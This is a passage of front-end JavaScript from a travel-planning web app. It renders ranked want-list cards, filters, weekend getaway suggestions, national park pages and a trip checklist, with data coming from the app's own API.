      <div class="items"><span class="pill">${v.needs_visa_total} need a visa</span></div></div>`;
  }
  $('#reach').innerHTML = html;
}

/* --------------------------------------------------------------- gaps --- */
function paintGaps(d) {
  const blind = d.blind_spots || [], near = d.nearest_unvisited || [], v = d.visa;
  let html = `<div class="gap"><h4>Emptiest corners of your map</h4><ul>`
    + blind.map((b) => `<li><span style="flex:1">
        <b>${b.subregion}</b>
        <div class="bar"><i style="width:${b.pct}%"></i></div></span>
        <span>${b.visited}/${b.countries}</span></li>`).join('')
    + `</ul></div>`;
  if (near.length) {
    html += `<div class="gap"><h4>Closest to home, never visited</h4><ul>`
      + near.map((n) => `<li><b>${n.name}</b><span>${n.km.toLocaleString()} km</span></li>`).join('')
      + `</ul></div>`;
  }
  if (v && v.known && v.easy_unvisited_names && v.easy_unvisited_names.length) {
    const sample = v.easy_unvisited_names.slice(0, 8);
    html += `<div class="gap"><h4>Open to your passport, still unvisited</h4>
      <div class="items" style="display:flex;flex-wrap:wrap;gap:5px">
        ${sample.map((n) => `<span class="pill">${n}</span>`).join('')}
        ${v.easy_unvisited_names.length > 8
          ? `<span class="pill more">+${v.easy_unvisited_names.length - 8} more</span>` : ''}
      </div></div>`;
  }
  $('#gaps').innerHTML = html;
}

/* ================================================================= http === */
async function post(url, body, opts = {}) {
  const headers = { 'Content-Type': 'application/json' };
  if (state.auth.token) headers.Authorization = `Bearer ${state.auth.token}`;
  const r = await fetch(API + url, {
    method: 'POST', headers, body: JSON.stringify(body), ...opts,
  });
  if (!r.ok) throw new Error(detail(await r.text()) || `${r.status}`);
  return r.json();
}
async function get(url) {
  const headers = {};
  if (state.auth.token) headers.Authorization = `Bearer ${state.auth.token}`;
  const r = await fetch(API + url, { headers });
  if (!r.ok) throw new Error(detail(await r.text()) || `${r.status}`);
  return r.json();
}
/* FastAPI puts the readable message in .detail — showing raw JSON to a user
   who simply mistyped their password would be unkind. */
function detail(text) {
  try {
    const d = JSON.parse(text);
    if (typeof d.detail === 'string') return d.detail;
    // pydantic validation errors come back as a list of objects; showing the
    // raw JSON to a user is worse than showing nothing
    if (Array.isArray(d.detail)) {
      return d.detail.map((e) => e.msg || '').filter(Boolean).join('; ')
        || 'That request was not valid.';
    }
    return 'Something went wrong on the server.';
  } catch (e) { return (text || '').slice(0, 180); }
}
const thinking = (el, msg) =>
  el.innerHTML = `<div class="thinking"><i></i><i></i><i></i> ${msg}</div>`;
const oops = (el, e) =>
  el.innerHTML = `<div class="err">${ICON('i-tower')}<span>${esc(String(e.message)).includes('fetch')
    ? 'Can’t reach the backend — is uvicorn running on port 8200?' : e.message}</span></div>`;

/* ========================================================== agent tiers === */
$('#go-verdict').onclick = async () => {
  const out = $('#verdict-out');
  if (!state.lastProfile)
    return (out.innerHTML = `<div class="err">${ICON('i-tower')}<span>Label some countries first.</span></div>`);
  thinking(out, 'the analyst is reading your map…');
  try {
    const v = (await post('/api/verdict', payload())).verdict;
    out.innerHTML = `<div class="readout"><p>${esc(v.headline)}</p>`
      + `<ul class="obs">${v.observations.map((o) => `<li>${esc(o)}</li>`).join('')}</ul>`
      + `<p class="peer">${esc(v.peer_note)}</p></div>`;
  } catch (e) { oops(out, e); }
};

/* The want-list appears the moment the page opens. Every figure on these cards
   is arithmetic — 22 ms from the server — so making someone press a button to
   see their own list was a waste of their time. The button is now only for the
   part that genuinely needs a model: why, and what you are walking into. */
function emptyWant() {
  return `<div class="empty">${ICON('i-pin', 'i xl')}
    <p>Nothing on your want-list yet.</p>
    <p class="muted" style="max-width:46ch;margin:0 auto 18px">This page ranks the
    countries <em>you</em> chose — mark a few as &ldquo;want to go&rdquo; on the map
    and they will show up here.</p>
    <a class="btn solid" href="#/map">Open the map${ICON('i-arrow')}</a></div>`;
}

/* Wry rather than chirpy — the brand is "traveler not a tourist", not a holiday
   brochure. The line is picked from the data, so it is never generic filler. */
function wantLede(picks, q) {
  const n = picks.length, many = n > 1;
  const head = many ? `<b>${n}</b> places you&rsquo;ve promised yourself.`
                    : `One place you&rsquo;ve promised yourself.`;
  const top = picks.find((p) => p.one_in_n_trips);
  let line;
  if (!top) {
    line = many
      ? `Not one of them publishes visitor figures, which is its own kind of answer.`
      : `It publishes no visitor figures at all, which is its own kind of answer.`;
  } else {
    const r = top.one_in_n_trips, c = `<b>${esc(top.country)}</b>`;
    // Tiers come from the real distribution of all 206 destinations, not from
    // round numbers that felt about right.
    line = r >= q.p95
      ? `Start with ${c}: about 1 in ${r.toLocaleString()} of the world&rsquo;s trips ends
         there. You will not be queuing.`
      : r >= q.p75
        ? `${c} ${many ? 'leads, and is' : 'is'} rarer than three quarters of the
           destinations on Earth.`
        : r >= q.p50
          ? `${c} ${many ? 'leads — ' : ''}sits off the main line, with fewer visitors
             than half the world&rsquo;s destinations.`
          : r >= q.p25
            ? `${c} ${many ? 'leads. Well known' : 'is well known'}, though hardly a crush.`
            : many
              ? `Be honest: these are the well-trodden ones. No shame in it, but your map
                 will barely feel it.`
              : `Be honest: that one is well trodden. No shame in it, but your map will
                 barely feel it.`;
  }
  return `<p class="lead">${head} ${line}</p>
    <p class="leadsub">Ranked by how much each would move your map, boldest first.
      Pick one and the architect builds the days around it.</p>`;
}

function wantCards(picks, prose) {
  const bold = picks.length > 1 && picks[0].one_in_n_trips
    && (!picks[1].one_in_n_trips || picks[0].one_in_n_trips >= picks[1].one_in_n_trips * 3);
  return picks.map((p, i) => {
    const why = prose && prose[p.country];
    return `<div class="card">
      ${i === 0 && bold ? `<div class="ribbon">${ICON('i-sparkle')}boldest move</div>` : ''}
      <div class="name"><img class="flag sm" src="${flagUrl(p.country, 20)}" alt="" />${p.country}</div>
      <div class="rare">${ICON('i-sparkle')}${p.one_in_n_trips
        ? `1 in ${p.one_in_n_trips.toLocaleString()} trips`
        : 'no arrivals figure published'}</div>
      <div class="facts">${p.arrivals
        ? `${p.arrivals.toLocaleString()} arrivals in ${p.reference_year} &middot; ${p.region}`
        : 'UN Tourism publishes nothing for this one &mdash; you can still go.'}</div>
      ${cardMeta(p)}
      ${why ? `<div class="why">${esc(why.why)}</div>
               ${why.caution ? `<div class="caution">${ICON('i-tower')}<span>${esc(why.caution)}</span></div>` : ''}`
            : ''}
      <button class="btn sm" data-plan="${p.country}">${ICON('i-suitcase')}Plan this</button>
    </div>`;
  }).join('');
}

/* Visa, price, distance and weather, as small tags on the card. Each appears
   only when the underlying figure exists — no placeholders, no zeroes. */
function cardMeta(p) {
  const bits = [];
  if (p.visa) {
    bits.push(`<span class="tagx ${p.visa.easy ? 'ok' : 'warn'}">${ICON('i-ticket')}${p.visa.detail}</span>`);
  }
  if (p.km) {
    bits.push(`<span class="tagx">${ICON('i-plane')}${Math.round(p.km).toLocaleString()} km</span>`);
  }
  if (p.price) {
    bits.push(`<span class="tagx ${p.price.ratio < 0.9 ? 'ok' : ''}">${ICON('i-suitcase')}${p.price.label}</span>`);
  }
  if (p.best_months) {
    bits.push(`<span class="tagx sun" title="${p.best_months.caveat}">${ICON('i-sun')}`
      + `best weather ${p.best_months.months.join(', ')}</span>`);
  }
  if (!bits.length) return '';
  return `<div class="meta">${bits.join('')}</div>`
    + (p.best_months ? `<div class="weathernote">Weather only — no public data says which months are quietest.</div>` : '');
}

/* Filters narrow the cards already on screen. Nothing is re-fetched and
   nothing leaves the page. */
const recFilters = { visa: false, cheap: false, near: false };

function applyFilters() {
  let picks = [...(state.shortlist || [])];
  if (recFilters.visa) picks = picks.filter((p) => p.visa && !p.visa.advance);
  if (recFilters.cheap) picks = picks.filter((p) => p.price && p.price.ratio < 0.9);
  if (recFilters.near) picks.sort((a, b) => (a.km ?? 9e9) - (b.km ?? 9e9));
  const out = $('#rec-out');
  if (!picks.length) {
    out.innerHTML = `<div class="empty">${ICON('i-pin', 'i xl')}
      <p>Nothing on your want-list matches those filters.</p></div>`;
    return;
  }
  out.innerHTML = `<div class="grid">${wantCards(picks, state.prose)}</div>`;
  wireCards(out);
}

function paintFilters(picks) {
  const bar = $('#rec-filters');
  const anyVisa = picks.some((p) => p.visa), anyPrice = picks.some((p) => p.price),
        anyKm = picks.some((p) => p.km);
  bar.hidden = !(anyVisa || anyPrice || anyKm);
  const set = (k, on) => {
    const b = bar.querySelector(`[data-f="${k}"]`);
    b.disabled = !on;
    b.title = on ? '' : 'Set your home country and passport to use this';
    if (!on) { recFilters[k] = false; b.classList.remove('on'); }
  };
  set('visa', anyVisa); set('cheap', anyPrice); set('near', anyKm);
}

$$('#rec-filters .chip-f').forEach((b) => b.onclick = () => {
  recFilters[b.dataset.f] = !recFilters[b.dataset.f];
  b.classList.toggle('on', recFilters[b.dataset.f]);
  applyFilters();
});

function wireCards(root) {
  root.querySelectorAll('[data-plan]').forEach((b) =>
    b.onclick = () => { addStopByName(b.dataset.plan); location.hash = '#/trip'; });
}

/* Used by "Plan this" and the want-list shortcuts: both now add a stop rather
   than overwrite a single destination, so several can be collected. */
function addStopByName(name) {
  const c = state.byName.get(name);
  if (!c || !c.iso3) return;
  if (state.stops.some((s) => s.iso3 === c.iso3 && !s.city)) return;
  if (state.stops.length >= 10) return;
  state.stops.push({ iso3: c.iso3, country: name, city: null });
  if ($('#s-list')) { renderStops(); refreshRoute(); }
  if (window.__paintVisaBox) window.__paintVisaBox(false);
}

/* instant tier — runs on every visit to the page */
async function shortlist() {
  const out = $('#rec-out'), head = $('#rec-head');
  if (!state.labels.want.size) {
    head.innerHTML = '';
    $('#go-rec').hidden = true;
    $('#rec-filters').hidden = true;
    out.innerHTML = emptyWant();
    return;
  }
  try {
    const d = await post('/api/shortlist', payload());
    const picks = d.recommendations;
    state.shortlist = picks;
    if (!picks.length) {
      head.innerHTML = '';
      $('#go-rec').hidden = true;
      out.innerHTML = `<div class="empty">${ICON('i-pin', 'i xl')}
        <p>You have already been everywhere on your want-list.</p>
        <a class="btn solid" href="#/map">Mark somewhere new${ICON('i-arrow')}</a></div>`;
      return;
    }
    head.innerHTML = wantLede(picks, d.rarity_quartiles);
    $('#go-rec').hidden = false;
    state.prose = null;
    paintFilters(picks);
    applyFilters();
  } catch (e) { oops(out, e); }
}

/* agent tier — only the prose, folded into the cards already on screen */
$('#go-rec').onclick = async () => {
  const out = $('#rec-out'), btn = $('#go-rec');
  btn.disabled = true;
  const note = document.createElement('div');
  note.style.marginBottom = '13px';
  thinking(note, 'the analyst is reading your list…');
  out.before(note);
  try {
    const r = (await post('/api/recommend', payload())).recommendations;
    const prose = {};
    (r.picks || []).forEach((p) => prose[p.country] = p);
    state.prose = prose;
    $('#rec-head').innerHTML = `<p class="lead">${esc(r.intro)}</p>`;
    applyFilters();
    btn.innerHTML = `${ICON('i-compass')}Read it again`;
  } catch (e) { oops(note, e); }
  finally { note.remove(); btn.disabled = false; }
};

/* ============================================================= getaways === */
/* Rebuilt 23 Oct: this whole block was deleted by accident on the 17th, when a
   slice that was meant to remove one dead function reached from it all the way
   to the next marker and took Getaways with it. The page had been loading an
   empty panel ever since. */
const MODE_ICON = { drive: 'i-route', bus: 'i-route', train: 'i-ticket',
                    fly: 'i-plane', ferry: 'i-waves' };
const THEMES = [
  { key: 'romantic',  label: 'Romantic',  icon: 'i-sparkle' },
  { key: 'hiking',    label: 'Hiking',    icon: 'i-compass' },
  { key: 'food',      label: 'Food',      icon: 'i-ticket' },
  { key: 'history',   label: 'History',   icon: 'i-stamp' },
  { key: 'beach',     label: 'Beach',     icon: 'i-waves' },
  { key: 'nightlife', label: 'Nightlife', icon: 'i-sun' },
  { key: 'family',    label: 'Family',    icon: 'i-home' },
];

/* The theme changes what the scout is asked to find, not just the order — no
   dataset says a town is romantic, so the model names the places and the data
   checks they are real and in range. Picking one runs the search at once. */
function paintThemes() {
  const box = $('#wk-themes');
  if (!box) return;
  box.innerHTML = THEMES.map((t) =>
    `<button type="button" class="theme ${state.wk.theme === t.key ? 'on' : ''}" `
    + `data-t="${t.key}">${ICON(t.icon)}${t.label}</button>`).join('');
  box.querySelectorAll('.theme').forEach((b) => b.onclick = () => {
    state.wk.theme = state.wk.theme === b.dataset.t ? null : b.dataset.t;
    state.wk.notes = null;
    paintThemes();
    weekend();
  });
}

function wkOriginFromProfile() {
  if (!state.home) return null;
  return { home: state.home, home_city: state.homeCity,
           label: (state.homeCity ? state.homeCity + ', ' : '')
                  + (state.isoName.get(state.home) || state.home) };
}

function wkBody() {
  const o = state.wk.origin;
  const body = { passport: state.passport, theme: state.wk.theme,
                 max_km: +$('#wk-range').value || 600 };
  if (o.home) { body.home = o.home; body.home_city = o.home_city; }
  else { body.lat = o.lat; body.lon = o.lon; body.from_iso3 = o.iso3;
         body.from_label = o.label; }
  return body;
}

async function weekend() {
  const out = $('#wk-out');
  if (!out) return;
  if (!state.wk.origin) state.wk.origin = wkOriginFromProfile();
  paintThemes();
  const o = state.wk.origin;
  if (!o) {
    $('#wk-act').hidden = true;
    out.innerHTML = `<div class="empty">${ICON('i-route', 'i xl')}
      <p>Tell me where you are starting from.</p>
      <p class="muted" style="max-width:44ch;margin:0 auto">Type a city above — no
      account needed. Set a home country and city, top right, and it fills in
      by itself.</p></div>`;
    if (!$('#wk-city').value && state.homeCity) $('#wk-city').value = state.homeCity;
    return;
  }
  if (!$('#wk-city').value) $('#wk-city').value = o.label.split(',')[0];

  const themed = !!state.wk.theme;
  thinking(out, themed
    ? `finding the best ${THEMES.find((t) => t.key === state.wk.theme).label.toLowerCase()} spots near you…`
    : 'looking for places within range…');
  try {
    const body = wkBody();
    // With a theme the scout names the destinations and the data verifies
    // them; without one, the nearby-cities list is instant and costs nothing.
    const d = await post(themed ? '/api/getaway/suggest' : '/api/getaway', body);
    state.wk.places = d.places || [];
    state.wk.notes = themed
      ? Object.fromEntries((d.places || []).map((p) => [p.city, p])) : null;
    state.wk.last = d;
    renderWeekend(d);
    $('#wk-act').hidden = themed || !state.wk.places.length;
  } catch (e) { oops(out, e); $('#wk-act').hidden = true; }
}

function renderWeekend(d) {
  const out = $('#wk-out');
  d = { ...(state.wk.last || {}), ...(d || {}) };
  const places = d.places || [];
  if (!places.length) {
    out.innerHTML = `<div class="empty">${ICON('i-route', 'i xl')}
      <p>Nothing within ${(d.max_km || 600).toLocaleString()} km of ${esc(d.from || '')}.</p>
      <p class="muted">Try a wider range, or a different theme.</p></div>`;
    return;
  }
  state.wk.shown = places;
  const notes = state.wk.notes || {};
  const themeLabel = state.wk.theme
    ? THEMES.find((t) => t.key === state.wk.theme).label.toLowerCase() : null;

  out.innerHTML = (d.intro ? `<p class="lead">${esc(d.intro)}</p>` : '')
    + `<p class="leadsub">${places.length} ${themeLabel ? themeLabel + ' ' : ''}`
    + `${places.length === 1 ? 'spot' : 'spots'} within `
    + `${(d.max_km || 600).toLocaleString()} km of <b>${esc(d.from || '')}</b>`
    + (d.dropped && d.dropped.length
      ? `. ${d.dropped.length} other${d.dropped.length === 1 ? '' : 's'} named `
        + `(${esc(d.dropped.slice(0, 3).join(', '))}) turned out to be beyond that `
        + `range or not findable on a map, so they are not shown`
      : '')
    + `.</p>`
    + `<div class="grid">` + places.map((p) => {
      const n = notes[p.city];
      const fit = (n && state.wk.theme && n.fit) ? n.fit : null;
      const needsVisa = p.visa && p.visa.advance;
      const badge = fit
        ? `<span class="fit ${esc(fit)}">${fit === 'good' ? 'good for ' + esc(themeLabel)
            : fit === 'poor' ? 'not really ' + esc(themeLabel) : 'works'}</span>`
        : (p.abroad ? `<span class="tagx">${ICON('i-globe')}${esc(p.country)}</span>` : '');
      return `<div class="wkcard ${fit === 'poor' ? 'poor' : ''}">
        <div class="top"><h4>${esc(p.city)}<em>${esc(p.state || p.country)}</em></h4>
          <div class="topright"><span class="dist">${p.km.toLocaleString()} km</span>
            ${badge}</div></div>
        <div class="modes">${(p.modes || []).map((m, mi) =>
          `<button type="button" class="mode ${m.mode}" title="${esc(m.why)}" `
          + `data-city="${esc(p.city)}" data-mi="${mi}">`
          + `${ICON(MODE_ICON[m.mode] || 'i-route')}${esc(m.mode)}`
          + `<b style="font-weight:600;opacity:.75">${esc((m.range || '').split('–')[0].trim())}+</b>`
          + `</button>`).join('')}</div>
        <div class="modedetail" hidden></div>
        ${n && n.why ? `<div class="why">${esc(n.why)}</div>` : ''}
        ${needsVisa ? `<div class="vwarn">${ICON('i-tower')}<span>`
          + `Needs paperwork before you travel on your ${esc(state.passport)} `
          + `passport — ${esc(p.visa.detail)}.</span></div>` : ''}
        <button class="btn sm plan" data-plan-city="${esc(p.city)}">
          ${ICON('i-suitcase')}Plan two days here</button>
      </div>`;
    }).join('') + `</div>`
    + (d.modes_note ? `<p class="weathernote" style="margin-top:14px">${esc(d.modes_note)}</p>` : '');
}

/* Clicking a mode opens what can honestly be said about it: a time estimated
   from distance, and what that way of travelling involves. No timetables. */
on('#wk-out', 'onclick', (e) => {
  const chip = e.target.closest('.mode');
  if (chip) {
    const card = chip.closest('.wkcard');
    const place = (state.wk.shown || []).find((x) => x.city === chip.dataset.city);
    const m = place && place.modes[+chip.dataset.mi];
    const box = card.querySelector('.modedetail');
    const already = chip.classList.contains('open');
    card.querySelectorAll('.mode').forEach((c) => c.classList.remove('open'));
    if (already || !m) { box.hidden = true; return; }
    chip.classList.add('open');
    box.hidden = false;
    box.innerHTML = `<div class="hrs"><b>${esc(m.range)}</b>`
      + `<span>each way, by ${esc(m.mode)}</span></div>`
      + `<p>${esc(m.detail)}</p>`
      + `<p class="basis">${esc(m.why)} &middot; ${esc(m.basis)}</p>`;
    return;
  }
  const btn = e.target.closest('[data-plan-city]');
  if (btn) openPlan(btn.dataset.planCity);
});

/* ------------------------------------------------- two days in one city --- */
function closePlan() { $('#plan').hidden = true; }
on('#plan-close', 'onclick', closePlan);
on('#plan', 'onclick', (e) => { if (e.target.id === 'plan') closePlan(); });

async function openPlan(city) {
  const p = (state.wk.shown || []).find((x) => x.city === city);
  if (!p) return;
  const modal = $('#plan'), body = $('#plan-body');
  modal.hidden = false;
  body.innerHTML = `<h2>${esc(p.city)}</h2>`
    + `<p class="sub">${esc(p.state || '')}${p.state ? ' · ' : ''}${esc(p.country)}</p>`;
  const hold = document.createElement('div');
  thinking(hold, 'planning two days…');
  body.appendChild(hold);
  const fastest = [...(p.modes || [])].sort((a, b) => a.hours - b.hours)[0];
  try {
    const d = await post('/api/getaway/plan', {
      city: p.city, iso3: p.iso3, state: p.state, km: p.km,
      mode: fastest ? fastest.mode : null, theme: state.wk.theme,
      from_label: (state.wk.last || {}).from || null,
      lat: p.lat, lon: p.lon,
    });
    const it = d.itinerary;
    body.innerHTML = `<h2>${esc(d.city)}</h2>`
      + `<p class="sub">${esc(d.state || '')}${d.state ? ' · ' : ''}${esc(d.country)}`
      + `${d.theme ? ' · ' + esc(d.theme) + ' weekend' : ''}</p>`
      + (d.leg ? `<div class="planleg">${ICON(MODE_ICON[fastest.mode] || 'i-route')}`
          + `${esc(fastest.mode)} · ${esc(d.leg.range)} each way</div>` : '')
      + `<div class="readout" style="margin-bottom:14px"><p>${esc(it.summary)}</p></div>`
      + it.days.map((x) => `<div class="day"><div class="n">${esc(x.day)}</div>
          <div class="theme">${esc(x.theme)}</div>
          <ul class="obs" style="margin-top:0">${x.items.map((i) =>
            `<li>${esc(i)}</li>`).join('')}</ul></div>`).join('')
      + `<div class="readout"><p class="peer" style="border:0;margin:0;padding:0">`
      + `${esc(it.money_note)}</p>`
      + (it.guide_note ? `<p class="peer">${esc(it.guide_note)}</p>` : '') + `</div>`;
  } catch (e) { oops(body, e); }
}

on('#wk-range', 'onchange', () => weekend());

/* city search across every country, for someone with no home set */
let wkHits = [], wkTimer = null;
on('#wk-city', 'oninput', () => {
  clearTimeout(wkTimer);
  wkTimer = setTimeout(async () => {
    const q = $('#wk-city').value.trim(), box = $('#wk-suggest');
    if (q.length < 2) { box.hidden = true; return; }
    try {
      const r = await get(`/api/city-search?q=${encodeURIComponent(q)}`);
      wkHits = r.cities || [];
      if (!wkHits.length) {
        box.innerHTML = `<div class="none">No city of 15,000+ people matches that.</div>`;
        box.hidden = false; return;
      }
      box.innerHTML = wkHits.map((c, i) =>
        `<button type="button" data-i="${i}"><span>${esc(c.city)}</span>`
        + `<i>${esc([c.state, state.isoName.get(c.iso3) || c.iso3].filter(Boolean).join(' · '))}</i>`
        + `</button>`).join('');
      box.hidden = false;
      box.querySelectorAll('button').forEach((b) => b.onclick = () => {
        const c = wkHits[+b.dataset.i];
        state.wk.origin = { lat: c.lat, lon: c.lon, iso3: c.iso3,
                            label: `${c.city}${c.state ? ', ' + c.state : ''}` };
        $('#wk-city').value = c.city;
        box.hidden = true;
        weekend();
      });
    } catch (e) { box.hidden = true; }
  }, 180);
});
on('#wk-city', 'onblur', () => setTimeout(() => { $('#wk-suggest').hidden = true; }, 160));

on('#go-weekend', 'onclick', async () => {
  const btn = $('#go-weekend');
  if (!state.wk.origin || !state.wk.places.length) return weekend();
  btn.disabled = true;
  const note = document.createElement('div');
  note.style.margin = '0 0 13px';
  thinking(note, 'working out what each one is for…');
  $('#wk-out').before(note);
  try {
    const d = await post('/api/getaway/notes', wkBody());
    state.wk.notes = {};
    (d.notes.notes || []).forEach((n) => state.wk.notes[n.city] = n);
    if (d.places && d.places.length) {
      state.wk.places = d.places;
      state.wk.last = { ...(state.wk.last || {}), places: d.places };
    }
    renderWeekend({ places: state.wk.places });
    $('#wk-out').insertAdjacentHTML('afterbegin',
      `<p class="lead">${esc(d.notes.intro)}</p>`);
    btn.innerHTML = `${ICON('i-compass')}Read it again`;
  } catch (e) { oops(note, e); }
  finally { note.remove(); btn.disabled = false; }
});

/* ========================================================= collections === */
/* Photographs come from Wikimedia Commons and are referenced, not copied —
   freely licensed, and credited at the bottom of each park sheet. */
const LEG_ICON = { fly: 'i-plane', drive: 'i-route', transfer: 'i-route',
                   last: 'i-pin', train: 'i-ticket' };

async function collections() {
  const out = $('#pk-out');
  if (!state.parks.all.length) {
    thinking(out, 'loading the parks…');
    try {
      const d = await get('/api/collections/parks');
      state.parks.all = d.parks;
      state.parks.source = d.source;
      state.parks.picks = d.first_picks;
    } catch (e) { return oops(out, e); }
  }
  renderParks();
}

function renderParks() {
  const { all, country, q } = state.parks;
  const needle = (q || '').trim().toLowerCase();
  const rows = all.filter((p) =>
    (!country || p.iso3 === country)
    && (!needle || p.name.toLowerCase().includes(needle)
        || (p.state || '').toLowerCase().includes(needle)));
  const out = $('#pk-out');
  if (!rows.length) {
    out.innerHTML = `<div class="empty">${ICON('i-stamp', 'i xl')}
      <p>No park matches that.</p></div>`;
    return;
  }
  const flag = (iso3) => {
    const c = [...state.byName.values()].find((x) => x.iso3 === iso3);
    return c && c.iso2 ? `https://flagcdn.com/w40/${c.iso2.toLowerCase()}.png` : BLANK;
  };
  out.innerHTML = `<p class="parkcount">${rows.length} park${rows.length === 1 ? '' : 's'}`
    + `${country ? '' : ' across both countries'} — click one for the full page.</p>`
    + `<div class="parkgrid">` + rows.map((p) => `
      <button class="park" data-park="${esc(p.id)}">
        <div class="shot">${p.photo
          ? `<img src="${esc(p.photo)}" alt="${esc(p.name)}" loading="lazy"`
            + (p.photo_fallback
              ? ` onerror="this.onerror=null;this.src='${esc(p.photo_fallback)}'"` : '')
            + ` />`
          : `<div class="noimg">${ICON('i-stamp')}</div>`}
          <img class="flagbadge" src="${flag(p.iso3)}" alt="" /></div>
        <div class="body"><h4>${esc(p.name)}</h4>
          <div class="where">${esc(p.state || '')}</div>
          ${p.established ? `<div class="est">established ${esc(p.established)}</div>` : ''}
        </div>
      </button>`).join('') + `</div>`
    + `<p class="credit">${esc(state.parks.source || '')}</p>`;
  out.querySelectorAll('[data-park]').forEach((b) =>
    b.onclick = () => openPark(b.dataset.park));
  renderRank();
}

/* The busiest parks, ranked on published visitor numbers. Coverage is very
   uneven — almost every US park reports a figure, almost no Canadian one does
   in this source — so the panel shows the count it actually has rather than
   padding a short list out to five. */
function renderRank() {
  const rail = $('#pk-rail');
  const r = state.parks.picks;
  if (!rail || !r) return;
  const flag = (iso3) => {
    const c = [...state.byName.values()].find((x) => x.iso3 === iso3);
    return c && c.iso2 ? `https://flagcdn.com/w40/${c.iso2.toLowerCase()}.png` : BLANK;
  };
  const section = (iso3, label) => {
    const rows = r[iso3] || [];
    if (!rows.length) return '';
    return `<div class="rank">
      <h4><img src="${flag(iso3)}" alt="" />Travellers&rsquo; first picks · ${esc(label)}</h4>
      <p class="sub2">the five most people would choose first</p>
      <ol>${rows.map((p) => `
        <li data-park="${esc(p.id)}">
          ${p.photo ? `<img src="${esc(p.photo)}" alt="" loading="lazy" />` : ''}
          <span class="meta2"><span class="nm">${esc(p.name
            .replace(' National Park and Preserve', '')
            .replace(' National Park Reserve', '')
            .replace(' National Park', ''))}</span>
            <span class="vn">${esc(p.state || '')}</span>
            <span class="why2">${esc(p.why)}</span>
          </span></li>`).join('')}</ol>
    </div>`;
  };
  rail.innerHTML = section('USA', 'United States') + section('CAN', 'Canada');
  rail.querySelectorAll('[data-park]').forEach((li) =>
    li.onclick = () => openPark(li.dataset.park));
}

$$('#pk-filters .chip-f').forEach((b) => b.onclick = () => {
  state.parks.country = b.dataset.c;
  $$('#pk-filters .chip-f').forEach((x) => x.classList.toggle('on', x === b));
  renderParks();
});
on('#pk-search', 'oninput', () => {
  state.parks.q = $('#pk-search').value;
  renderParks();
});

function closePark() { $('#parkmodal').hidden = true; }
on('#park-close', 'onclick', closePark);
on('#parkmodal', 'onclick', (e) => { if (e.target.id === 'parkmodal') closePark(); });

async function openPark(id) {
  const modal = $('#parkmodal'), body = $('#park-body');
  modal.hidden = false;
  body.innerHTML = '';
  const hold = document.createElement('div');
  thinking(hold, 'opening the park…');
  body.appendChild(hold);
  try {
    // the measured half first: photo, facts and the journey, all instant
    const d = await post('/api/collections/park', {
      id, home: state.home, home_city: state.homeCity });
    const p = d.park, j = d.journey;
    body.innerHTML = (p.photo_large
        ? `<div class="parkhero"><img src="${esc(p.photo_large)}" alt="${esc(p.name)}" />
             <div class="cap"><h2>${esc(p.name)}</h2>
               <div class="where">${esc(p.state || '')}</div></div></div>`
        : `<h2>${esc(p.name)}</h2><p class="sub">${esc(p.state || '')}</p>`)
      + `<div class="parkfacts">`
      + (p.established ? `<span class="tagx">${ICON('i-stamp')}established ${esc(p.established)}</span>` : '')
      + (p.area_km2 ? `<span class="tagx">${ICON('i-globe')}${p.area_km2.toLocaleString()} km²</span>` : '')
      + (j ? `<span class="tagx ${j.drivable ? 'ok' : ''}">${ICON('i-plane')}`
             + `${j.direct_km.toLocaleString()} km from ${esc(j.from)}</span>` : '')
      + `</div>`
      + `<div id="park-guide"></div>`
      + (j ? `<div class="gsec"><h5>Getting there</h5><div class="leglist">`
          + j.legs.map((l) => `<div class="leg">
              <span class="ic">${ICON(LEG_ICON[l.stage] || 'i-route')}</span>
              <span class="txt"><b>${esc(l.from)} → ${esc(l.to)}</b>
                <span>${esc(l.note)}</span></span>
              <span class="num2">${l.km.toLocaleString()} km<br>${esc(l.range)}</span>
            </div>`).join('')
          + `</div>`
          + (j.base_town ? `<p class="credit">Nearest town to stay in: `
              + `<b>${esc(j.base_town.city)}, ${esc(j.base_town.state)}</b>, `
              + `${j.base_town.km} km from the gate.</p>` : '')
          + `<p class="credit">${esc(j.caveat)}</p></div>`
        : `<div class="gsec"><h5>Getting there</h5>
             <p class="credit">Set your home city, top right, and this shows the
             flights and drives from where you actually live.</p></div>`)
      + `<p class="credit">Photograph: Wikimedia Commons. ${esc(state.parks.source || '')}</p>`;

    // then the written half, which needs a model
    const g = $('#park-guide');
    thinking(g, 'reading up on the park…');
    const gd = await post('/api/collections/park/guide', { id });
    const gu = gd.guide;
    g.innerHTML = `<div class="gsec"><h5>What it is for</h5><p>${esc(gu.what_its_for)}</p></div>`
      + `<div class="gsec"><h5>When to go</h5><p>${esc(gu.best_months)}</p></div>`
      + (gu.avoid ? `<div class="gsec warn"><h5>When not to</h5><p>${esc(gu.avoid)}</p></div>` : '')
      + `<div class="gsec"><h5>How long you need</h5><p>${esc(gu.how_long)}</p></div>`
      + (gu.know_before && gu.know_before.length
        ? `<div class="gsec"><h5>Know before you go</h5>
             <ul class="obs" style="margin-top:0">${gu.know_before.map((k) =>
               `<li>${esc(k)}</li>`).join('')}</ul></div>` : '');
  } catch (e) { oops(body, e); }
}

/* ============================================= multi-stop trip builder === */
/* Country first, then city, because 34,000 cities in one list is unusable and
   "Springfield" means nothing without the country. Several stops can be added;
   the order is then solved so the travelling is as short as possible. */
/* ------------------------------------------------------------ trip list ---
   The checklist you tick off while you are actually travelling.

   It follows the same rule as the map, and for the same reason: signed in it
   lives on the server so it is there on the phone you are carrying, and while
   signed in nothing is written to localStorage, so a shared machine does not
   hand your list to the next guest. Signed out it stays in this browser. */
function loadTodoLocal() {
  try { return JSON.parse(localStorage.getItem(TODO_KEY) || '[]'); }
  catch (e) { return []; }
}

function saveTodo() {
  if (signedIn()) {
    post('/api/me/todo', { items: state.todo }).catch(() => {});
  } else {
    try { localStorage.setItem(TODO_KEY, JSON.stringify(state.todo)); }
    catch (e) { /* private mode: the list still works for this session */ }
  }
}

async function loadTodo() {
  if (signedIn()) {
    try { state.todo = (await get('/api/me/todo')).items || []; }
    catch (e) { state.todo = []; }
  } else {
    state.todo = loadTodoLocal();
  }
  paintTripRail();
}

/* Adding the same line twice is almost always a slip, so it moves to the end
   rather than appearing twice. */
function addTodo(text, where = '', quiet = false) {
  const t = (text || '').trim().slice(0, 200);
  if (!t) return false;
  const key = `${t.toLowerCase()}|${(where || '').toLowerCase()}`;
  const at = state.todo.findIndex((i) =>
    `${i.text.toLowerCase()}|${(i.where || '').toLowerCase()}` === key);
  if (at >= 0) state.todo.splice(at, 1);
  if (state.todo.length >= 120) {
    if (!quiet) flash('that is 120 items — plenty');
    return false;
